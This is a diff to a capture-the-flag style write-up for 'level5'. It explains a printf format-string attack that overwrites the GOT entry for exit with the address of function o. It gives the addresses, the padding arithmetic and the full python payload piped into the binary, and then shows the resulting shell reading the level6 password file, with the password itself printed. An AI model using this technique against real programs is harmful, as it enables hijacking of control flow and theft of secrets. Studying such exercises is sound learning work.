@@ -14,7 +14,7 @@ Looking at the code, we understand that we need to find a way to execute the `o`
 
 We previously learned that we can control printf to write a choosen value in a pointer of our choice.
 
-We want to overwrite the pointer to the exit function to point to the function `o`.
+We want to overwrite the pointer to which the exit function jumps to, to instead jump to the function `o`.
 
 **Step 3**
 We search for the address of exit:
@@ -31,8 +31,8 @@ disas exit
 The address of `exit` we want to overwrite is `0x8049838`
 The little endian version is \x38\x98\x04\x08
 
-The addres of `o` is `0x080484a4`.
-That gives 134513828 in decimal
+We find the address of `o` using `info func o` in gdb. It equals `0x080484a4`.
+That gives 134513828 in decimal.
 The padding is 134513828 - 4 = 134513824
 
 The offset in the format string:
@@ -49,6 +49,9 @@ We craft a the payload (exit_address_little_endian + padding_to_o_address + %4$n
 
 ```bash
 (python -c "print '\x38\x98\x04\x08' + '%134513824c' + '%4\$n'"; cat) | ./level5
+whoami
+level6
 cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 ```
 
